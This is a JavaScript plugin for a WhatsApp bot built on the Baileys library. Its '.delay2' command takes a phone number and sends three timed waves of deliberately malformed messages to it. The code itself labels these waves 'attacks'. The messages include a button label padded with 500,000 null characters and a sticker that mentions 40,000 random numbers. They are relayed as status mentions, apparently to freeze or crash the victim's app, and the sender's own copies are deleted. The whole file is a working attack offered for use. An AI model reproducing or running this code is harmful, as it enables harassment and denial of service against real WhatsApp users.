import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn, args }) => {
  const target = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  if (!target || !target.includes('@s.whatsapp.net')) {
    return conn.sendMessage(m.chat, { text: '😿 Número inválido. Usa: .delay2 +521XXXXXXXXXX' }, { quoted: m });
  }

  if (target === conn.user.id) {
    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m });
  }

  // 🟡 Aviso de inicio
  await conn.sendMessage(m.chat, { text: 'Comando en proceso 😼' }, { quoted: m });

  // 🚀 Ataque 1
  for (let round = 0; round < 10; round++) {
    setTimeout(() => {
      enviarTanda(conn, target, round + 1);
    }, round * 30000);
  }

  // ⏳ Ataque 2 (10 min después)
  setTimeout(() => {
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, target, round + 1);
      }, round * 30000);
    }
  }, 600000);

  // ⏳ Ataque 3 (20 min después)
  setTimeout(() => {
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, target, round + 1);
      }, round * 30000);
    }

    // ✅ Mensaje final
    setTimeout(() => {
      conn.sendMessage(m.chat, {
        text: 'El comando se realizó con éxito 🐢',
      }, { quoted: m });
    }, 300000);
  }, 1200000); // 20 minutos
};

handler.command = /^delay2$/i;
export default handler;

// 🔁 Utilidad: Delay
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// 💥 Función principal de envío
async function enviarTanda(conn, jid, num) {
  try {
    for (let i = 0; i < 20; i++) {
      const m1 = await InVisibleX(conn, jid, true);
      const m2 = await xatanicaldelayv2(conn, jid, true);

      await conn.sendMessage(conn.user.id, { delete: m1.key });
      await conn.sendMessage(conn.user.id, { delete: m2.key });

      await delay(1000);
    }
  } catch (e) {
    console.error("❌ Error en tanda:", e);
  }
}

// 🩸 Función InVisibleX
async function InVisibleX(sock, jid, mention) {
  const msg = await generateWAMessageFromContent(jid, {
    buttonsMessage: {
      text: "🩸",
      contentText: "@raysofhopee",
      footerText: "vip",
      buttons: [
        {
          buttonId: ".aboutb",
          buttonText: {
            displayText: "HADES VIP!" + "\u0000".repeat(500000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
      }],
    }],
  });

  if (mention) {
    await sock.relayMessage(jid, {
      groupStatusMentionMessage: {
        message: { protocolMessage: { key: msg.key, type: 25 } },
      },
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: { is_status_mention: "hmmm" },
        content: undefined,
      }],
    });
  }

  return msg;
}

// 😈 Función xatanicaldelayv2
async function xatanicaldelayv2(sock, jid, mention) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/...",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
      }],
    }],
  });

  return msg;
}
